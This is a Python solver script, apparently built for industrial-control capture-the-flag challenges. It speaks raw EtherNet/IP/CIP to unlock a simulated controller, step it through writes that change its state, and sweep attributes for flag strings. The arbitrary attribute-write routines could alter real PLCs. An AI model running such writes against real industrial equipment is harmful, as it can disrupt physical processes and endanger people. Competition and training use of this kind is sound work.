#!/usr/bin/env python3
"""
===================================================================
🏴‍☠️ ENIP/CIP STATE MACHINE RUNNER (GOD-MODE) 🏴‍☠️
===================================================================
Purpose: One-shot tool for state-gated CIP/ENIP challenges
         (e.g. BlackStart Grid PDS-9000, RTAF COC 2026 ICS family).

Solves the entire kill-chain in a SINGLE persistent TCP session:
  1. Unlock (magic words with optional word-swap)
  2. Sequential state-machine commands with status polling
  3. Hold-pattern (balanced load for stability ticks)
  4. Multi-class sweep (Class 0x04 Assembly + 0x64 Control)
  5. Hex→Base64→ASCII decode chain on vault payloads
  6. Silent-lock detection (verify after each write)

WHY this exists (lessons from BlackStart Grid CTF):
  - cpppo proxy_simple cannot issue Service 0x01 (Get Attribute All)
    with path-only requests, missing flags hidden in trailing payload
  - cpppo write returns generator; misuse = silent failure
  - PDS-9000 family uses Word-Swapped DINT (lower-word first)
  - State transitions reveal "hidden audit instances" only briefly
  - Vault payloads use chained encoding (hex(base64(ascii)))
  - Stability counter requires SAME TCP session held over time

Usage:
  # Full kill-chain in one shot (BlackStart Grid example):
  python3 enip_state_machine_runner.py --ip 192.168.1.22 \\
      --unlock "0x64/1/3=0xA001,0xC0DE | 0x64/1/4=0xB002,0xC0DE | 0x64/1/5=0xC003,0xC0DE" \\
      --sequence "0x64/2/2=1:wait=0x64/2/1==2 | 0x64/3/2=1 | 0x64/4/2=1:wait=0x64/4/1==2 | 0x64/5/2=0x5359:wait=0x64/5/1==2 | 0x64/6/2=1" \\
      --hold "0x64/2/3=50,0x64/4/3=50:duration=20" \\
      --sweep "0x04:1-200,0x64:1-30" \\
      --decode-chain "hex,base64" \\
      --json

  # Just sweep + decode (no state machine needed):
  python3 enip_state_machine_runner.py --ip <IP> --sweep "0x04:1-200,0x64:1-30"

  # Just unlock with verify:
  python3 enip_state_machine_runner.py --ip <IP> \\
      --unlock "0x64/1/3=0xA001,0xC0DE" --verify-each

===================================================================
"""
import argparse
import socket
import struct
import time
import json
import sys
import re
import base64
import binascii
from typing import List, Tuple, Optional, Dict, Any

# ANSI Colors
G = '\033[92m'; Y = '\033[93m'; R = '\033[91m'; C = '\033[96m'; W = '\033[0m'

DEFAULT_FLAG_REGEX = r"(?:coc2026|flag|f1ag|fl4g|tiger|ctf|key|rtaf)\{[^}]{4,120}\}"


# ===== ENIP/CIP Raw Protocol =====

class ENIPClient:
    """Raw socket ENIP/CIP client. Persistent session with all primitives."""

    def __init__(self, ip: str, port: int = 44818, timeout: float = 5.0):
        self.ip = ip
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self.session_id: int = 0

    def connect(self) -> bool:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        try:
            self.sock.connect((self.ip, self.port))
        except Exception as e:
            print(f"{R}[-] Connect failed: {e}{W}")
            return False
        # RegisterSession (0x0065)
        hdr = struct.pack('<HHLLQL', 0x65, 4, 0, 0, 0, 0)
        data = struct.pack('<HH', 1, 0)
        self.sock.send(hdr + data)
        resp = self.sock.recv(1024)
        if len(resp) < 24:
            return False
        self.session_id = struct.unpack('<L', resp[4:8])[0]
        return True

    def close(self):
        if self.sock:
            try: self.sock.close()
            except: pass
            self.sock = None

    def _build_path(self, cls: int, inst: Optional[int] = None, attr: Optional[int] = None) -> bytes:
        """Build CIP path segments (8-bit logical segments)."""
        path = struct.pack('<BB', 0x20, cls)
        if inst is not None:
            path += struct.pack('<BB', 0x24, inst)
        if attr is not None:
            path += struct.pack('<BB', 0x30, attr)
        return path

    def _send_rr(self, cip_req: bytes) -> bytes:
        """Wrap CIP request in SendRRData, send, return response payload."""
        cpf = struct.pack('<L H H', 0, 0, 2)        # iface_handle, timeout, item_count
        cpf += struct.pack('<HH', 0, 0)              # null address item
        cpf += struct.pack('<HH', 0xB2, len(cip_req)) + cip_req  # unconnected data item
        enip_hdr = struct.pack('<HHLLQL', 0x6F, len(cpf), self.session_id, 0, 0, 0)
        self.sock.send(enip_hdr + cpf)
        resp = self.sock.recv(8192)
        return resp

    def cip_get_attribute_single(self, cls: int, inst: int, attr: int) -> Tuple[int, bytes]:
        """Service 0x0E. Returns (status, data)."""
        path = self._build_path(cls, inst, attr)
        cip = struct.pack('<BB', 0x0E, len(path) // 2) + path
        resp = self._send_rr(cip)
        return self._parse_cip_response(resp, expected_service=0x8E)

    def cip_get_attribute_all(self, cls: int, inst: int) -> Tuple[int, bytes]:
        """Service 0x01. Returns (status, data). NO TRUNCATION."""
        path = self._build_path(cls, inst)
        cip = struct.pack('<BB', 0x01, len(path) // 2) + path
        resp = self._send_rr(cip)
        return self._parse_cip_response(resp, expected_service=0x81)

    def cip_set_attribute_single(self, cls: int, inst: int, attr: int, data: bytes) -> Tuple[int, bytes]:
        """Service 0x10. Returns (status, data)."""
        path = self._build_path(cls, inst, attr)
        cip = struct.pack('<BB', 0x10, len(path) // 2) + path + data
        resp = self._send_rr(cip)
        return self._parse_cip_response(resp, expected_service=0x90)

    @staticmethod
    def _parse_cip_response(resp: bytes, expected_service: int) -> Tuple[int, bytes]:
        """Locate CIP reply in raw ENIP buffer; return (status, payload_after_status)."""
        marker = bytes([expected_service, 0x00])
        idx = resp.find(marker)
        if idx == -1:
            return (-1, b'')
        if len(resp) < idx + 4:
            return (-1, b'')
        status = resp[idx + 2]
        # Skip: service(1) reserved(1) status(1) ext_status_size(1) = 4 bytes
        payload = resp[idx + 4:]
        return (status, payload)


# ===== Decode Engine =====

def decode_chain_pipeline(payload: bytes, chain: List[str]) -> List[bytes]:
    """Apply user-specified decode chain. Returns list of all intermediate decoded forms."""
    results = [payload]
    current = payload
    for step in chain:
        step = step.strip().lower()
        try:
            if step == 'hex':
                # Find largest hex run
                text = current.decode('ascii', errors='ignore').strip()
                m = re.search(r'[0-9a-fA-F]{16,}', text)
                if m:
                    h = m.group(0)
                    if len(h) % 2: h = h[:-1]
                    current = binascii.unhexlify(h)
                    results.append(current)
            elif step == 'base64':
                text = current.decode('ascii', errors='ignore').strip()
                m = re.search(r'[A-Za-z0-9+/=]{8,}', text)
                if m:
                    b = m.group(0)
                    pad = (-len(b)) % 4
                    current = base64.b64decode(b + ('=' * pad), validate=False)
                    results.append(current)
            elif step == 'ascii':
                pass  # already raw bytes
        except Exception:
            break
    return results


def find_flags(payload: bytes, flag_re: re.Pattern) -> List[str]:
    """Extract flags from payload, with auto-decode for hex+base64 nested forms."""
    flags = set()

    def _scan(blob: bytes):
        try:
            text = blob.decode('utf-8', errors='ignore')
            for m in flag_re.finditer(text):
                flags.add(m.group(0))
        except Exception:
            pass

    _scan(payload)

    # Try hex decode
    try:
        text = payload.decode('utf-8', errors='ignore')
        for hc in re.findall(r'[0-9a-fA-F]{20,}', text):
            if len(hc) % 2: hc = hc[:-1]
            try:
                hd = binascii.unhexlify(hc)
                _scan(hd)
                # Hex→Base64 chain
                try:
                    b64s = hd.decode('ascii', errors='ignore').strip()
                    if re.fullmatch(r'[A-Za-z0-9+/=]+', b64s) and len(b64s) >= 8:
                        pad = (-len(b64s)) % 4
                        bd = base64.b64decode(b64s + ('=' * pad), validate=False)
                        _scan(bd)
                except Exception:
                    pass
            except Exception:
                pass
    except Exception:
        pass

    # Try direct base64
    try:
        text = payload.decode('utf-8', errors='ignore')
        for bc in re.findall(r'[A-Za-z0-9+/=]{16,}', text):
            pad = (-len(bc)) % 4
            try:
                bd = base64.b64decode(bc + ('=' * pad), validate=False)
                _scan(bd)
            except Exception:
                pass
    except Exception:
        pass

    return sorted(flags)


# ===== Spec Parsers =====

def parse_path_spec(spec: str) -> Tuple[int, int, Optional[int]]:
    """Parse 'cls/inst[/attr]' (hex or decimal). Returns (cls, inst, attr_or_None)."""
    parts = spec.split('/')
    def to_int(s):
        s = s.strip()
        return int(s, 16) if s.lower().startswith('0x') else int(s)
    cls = to_int(parts[0])
    inst = to_int(parts[1])
    attr = to_int(parts[2]) if len(parts) > 2 else None
    return cls, inst, attr


def parse_int_value(s: str) -> int:
    s = s.strip()
    if s.lower().startswith('0x'):
        v = int(s, 16)
    else:
        v = int(s)
    return v


def values_to_bytes(vals: List[int], word_swap: bool = False) -> bytes:
    """Convert list of int values to little-endian INT16 bytes (with optional word swap)."""
    if word_swap and len(vals) >= 2:
        vals = vals[::-1]
    out = bytearray()
    for v in vals:
        if v > 32767: v -= 0x10000
        if v < -32768: v += 0x10000
        out += struct.pack('<h', v)
    return bytes(out)


# ===== Action Engine =====

class StateMachineRunner:
    def __init__(self, client: ENIPClient, args, report: Dict[str, Any]):
        self.c = client
        self.args = args
        self.report = report
        self.flag_re = re.compile(args.flag_regex, re.IGNORECASE)

    def log(self, msg: str):
        if not self.args.json:
            print(msg)

    def _write_path(self, cls: int, inst: int, attr: int, vals: List[int]) -> bool:
        data = values_to_bytes(vals, word_swap=self.args.word_swap)
        status, _ = self.c.cip_set_attribute_single(cls, inst, attr, data)
        return status == 0

    def _read_int(self, cls: int, inst: int, attr: int) -> Optional[int]:
        status, payload = self.c.cip_get_attribute_single(cls, inst, attr)
        if status == 0 and len(payload) >= 2:
            return struct.unpack('<H', payload[:2])[0]
        return None

    # --- Phase 1: Unlock ---
    def do_unlock(self, spec: str) -> bool:
        """spec = 'cls/inst/attr=v1,v2 | cls/inst/attr=v1,v2'"""
        self.log(f"\n{C}[Phase 1: UNLOCK]{W}")
        steps = [s.strip() for s in spec.split('|') if s.strip()]
        ok_count = 0
        for step in steps:
            path, vals = step.split('=', 1)
            cls, inst, attr = parse_path_spec(path)
            ints = [parse_int_value(v) for v in vals.split(',')]
            self.log(f"  Write @0x{cls:02X}/{inst}/{attr} <- {ints}"
                     + (f" {Y}(word-swap){W}" if self.args.word_swap and len(ints) >= 2 else ""))
            if self._write_path(cls, inst, attr, ints):
                ok_count += 1
                if self.args.verify_each:
                    time.sleep(0.3)
                    rb = self._read_int(cls, inst, attr)
                    expected = (ints[::-1] if self.args.word_swap else ints)[0] & 0xFFFF
                    if rb != expected:
                        self.log(f"    {R}[!] SILENT-LOCK detected: expected {expected:#x}, got {rb}{W}")
                        self.report.setdefault('silent_locks', []).append(path)
            else:
                self.log(f"    {R}[-] Write failed{W}")
        self.report['unlock_steps_ok'] = ok_count
        return ok_count == len(steps)

    # --- Phase 2: Sequence ---
    def do_sequence(self, spec: str) -> bool:
        """spec = 'cls/inst/attr=val[:wait=cls/inst/attr==target] | ...'"""
        self.log(f"\n{C}[Phase 2: SEQUENCE]{W}")
        steps = [s.strip() for s in spec.split('|') if s.strip()]
        seq_results = []
        for i, step in enumerate(steps, 1):
            # Split write part from optional wait clause
            parts = step.split(':')
            write_part = parts[0]
            wait_clause = None
            for p in parts[1:]:
                if p.strip().startswith('wait='):
                    wait_clause = p.strip()[5:]

            path, val = write_part.split('=', 1)
            cls, inst, attr = parse_path_spec(path)
            v = parse_int_value(val)
            self.log(f"  [{i}] Write @0x{cls:02X}/{inst}/{attr} <- 0x{v:04X}")
            if not self._write_path(cls, inst, attr, [v]):
                self.log(f"      {R}[-] Write failed{W}")
                seq_results.append({"step": i, "ok": False, "reason": "write_failed"})
                return False

            # Wait clause: poll Y until == Z
            if wait_clause:
                wpath, wtarget = wait_clause.split('==')
                wcls, winst, wattr = parse_path_spec(wpath.strip())
                target = parse_int_value(wtarget.strip())
                self.log(f"      Polling @0x{wcls:02X}/{winst}/{wattr} == {target}...", )
                ok = False
                tripped = False
                for poll_i in range(int(self.args.poll_timeout * 2)):
                    cur = self._read_int(wcls, winst, wattr)
                    if cur == target:
                        self.log(f"      {G}[+] READY (={cur}){W}")
                        ok = True
                        break
                    if cur == 3:  # UNSTABLE/FAULT in PDS-9000 family
                        self.log(f"      {R}[!] TRIPPED (state=3, UNSTABLE){W}")
                        tripped = True
                        break
                    time.sleep(0.5)
                if not ok:
                    seq_results.append({"step": i, "ok": False, "tripped": tripped})
                    if not self.args.continue_on_fail:
                        return False
                else:
                    seq_results.append({"step": i, "ok": True})
            else:
                seq_results.append({"step": i, "ok": True, "no_wait": True})
                # Small settle delay between writes without explicit wait
                time.sleep(self.args.settle_delay)
        self.report['sequence_results'] = seq_results
        return True

    # --- Phase 3: Hold Pattern ---
    def do_hold(self, spec: str):
        """spec = 'cls/inst/attr=val,cls/inst/attr=val:duration=N'"""
        self.log(f"\n{C}[Phase 3: HOLD PATTERN]{W}")
        write_part, *opts = spec.split(':')
        duration = 20.0
        for opt in opts:
            if opt.strip().startswith('duration='):
                duration = float(opt.split('=', 1)[1])
        # Apply writes
        for w in write_part.split(','):
            path, val = w.split('=', 1)
            cls, inst, attr = parse_path_spec(path)
            v = parse_int_value(val)
            self.log(f"  Set @0x{cls:02X}/{inst}/{attr} = {v}")
            self._write_path(cls, inst, attr, [v])
        self.log(f"  Holding TCP session for {duration}s...")
        # Keep socket alive by polling something every 2s
        elapsed = 0.0
        while elapsed < duration:
            time.sleep(min(2.0, duration - elapsed))
            elapsed += 2.0
            # Touch any attribute to keep session active
            self.c.cip_get_attribute_single(0x64, 1, 1)
        self.log(f"  {G}[+] Hold complete ({duration}s){W}")

    # --- Phase 4: Sweep ---
    def do_sweep(self, spec: str) -> List[Dict[str, str]]:
        """spec = 'cls:start-end,cls:start-end' (uses Get Attribute All)"""
        self.log(f"\n{C}[Phase 4: SWEEP]{W}")
        targets = []
        for part in spec.split(','):
            cls_str, range_str = part.split(':')
            cls = parse_int_value(cls_str)
            if '-' in range_str:
                a, b = range_str.split('-')
                rng = range(int(a), int(b) + 1)
            else:
                rng = [int(range_str)]
            for inst in rng:
                targets.append((cls, inst))

        self.log(f"  Sweeping {len(targets)} (class, inst) pairs via Get Attribute All...")
        found = []
        for cls, inst in targets:
            status, payload = self.c.cip_get_attribute_all(cls, inst)
            if status != 0 or not payload:
                continue
            flags = find_flags(payload, self.flag_re)
            if flags:
                for f in flags:
                    record = {"path": f"@0x{cls:02X}/{inst}", "flag": f}
                    found.append(record)
                    self.log(f"  {G}[FLAG] @0x{cls:02X}/{inst} -> {f}{W}")
            elif self.args.verbose:
                preview = payload[:60].decode('utf-8', errors='ignore').strip()
                if preview:
                    self.log(f"  @0x{cls:02X}/{inst} ({len(payload)}B): {preview!r}")
        self.report['flags'] = found
        return found


# ===== Main =====

def main():
    parser = argparse.ArgumentParser(
        description="ENIP/CIP State Machine Runner - one-shot kill-chain for state-gated ICS challenges",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, default=44818, help="Target port (default: 44818)")
    parser.add_argument("--timeout", type=float, default=5.0, help="Socket timeout (default: 5)")

    parser.add_argument("--unlock", default="",
                        help="Unlock spec: 'cls/inst/attr=v1,v2 | cls/inst/attr=v1,v2'")
    parser.add_argument("--sequence", default="",
                        help="Sequence spec: 'cls/inst/attr=val[:wait=cls/inst/attr==target] | ...'")
    parser.add_argument("--hold", default="",
                        help="Hold spec: 'cls/inst/attr=val,cls/inst/attr=val:duration=N'")
    parser.add_argument("--sweep", default="",
                        help="Sweep spec: 'cls:start-end,cls:start-end' (uses Get Attribute All)")

    parser.add_argument("--word-swap", action="store_true",
                        help="Word-swap multi-INT writes (PDS-9000 family DINT layout)")
    parser.add_argument("--verify-each", action="store_true",
                        help="Verify after each unlock write (silent-lock detection)")
    parser.add_argument("--continue-on-fail", action="store_true",
                        help="Continue sequence even if one step times out")
    parser.add_argument("--poll-timeout", type=float, default=30.0,
                        help="Max seconds to wait for status==target (default: 30)")
    parser.add_argument("--settle-delay", type=float, default=0.5,
                        help="Delay between sequence steps without explicit wait (default: 0.5)")
    parser.add_argument("--decode-chain", default="",
                        help="Apply explicit decode chain to sweep payloads, e.g. 'hex,base64'")
    parser.add_argument("--flag-regex", default=DEFAULT_FLAG_REGEX,
                        help="Flag detection regex")
    parser.add_argument("--verbose", action="store_true", help="Show non-flag sweep payload previews")
    parser.add_argument("--json", action="store_true", help="JSON output for AI agents")

    args = parser.parse_args()

    if not args.json:
        print(f"\n{C}=================================================={W}")
        print(f"{C} 🏴‍☠️ ENIP/CIP STATE MACHINE RUNNER (GOD-MODE) 🏴‍☠️ {W}")
        print(f"{C}=================================================={W}")
        print(f"[*] Target: {args.ip}:{args.port}")

    report = {
        "target": f"{args.ip}:{args.port}",
        "phases": [],
        "flags": [],
        "silent_locks": []
    }

    client = ENIPClient(args.ip, args.port, args.timeout)
    if not client.connect():
        report["status"] = "connect_failed"
        if args.json: print(json.dumps(report, indent=2))
        sys.exit(1)
    if not args.json:
        print(f"[+] Session registered: 0x{client.session_id:08X}")

    runner = StateMachineRunner(client, args, report)

    try:
        if args.unlock:
            ok = runner.do_unlock(args.unlock)
            report["phases"].append({"phase": "unlock", "ok": ok})

        if args.sequence:
            ok = runner.do_sequence(args.sequence)
            report["phases"].append({"phase": "sequence", "ok": ok})

        if args.hold:
            runner.do_hold(args.hold)
            report["phases"].append({"phase": "hold", "ok": True})

        if args.sweep:
            flags = runner.do_sweep(args.sweep)
            report["phases"].append({"phase": "sweep", "ok": True, "flag_count": len(flags)})
    finally:
        client.close()

    if args.json:
        print(json.dumps(report, indent=2, default=str))
    else:
        print(f"\n{C}=================================================={W}")
        flag_count = len(report.get('flags', []))
        if flag_count:
            print(f"{G}[+] MISSION COMPLETE: {flag_count} flag(s) extracted{W}")
            for f in report['flags']:
                print(f"  {G}{f['flag']}{W}  ({f['path']})")
        else:
            print(f"{Y}[-] No flags found in sweep phase{W}")
        if report.get('silent_locks'):
            print(f"{Y}[!] Silent-locks detected on: {report['silent_locks']}{W}")
        print(f"{C}=================================================={W}")


if __name__ == "__main__":
    main()
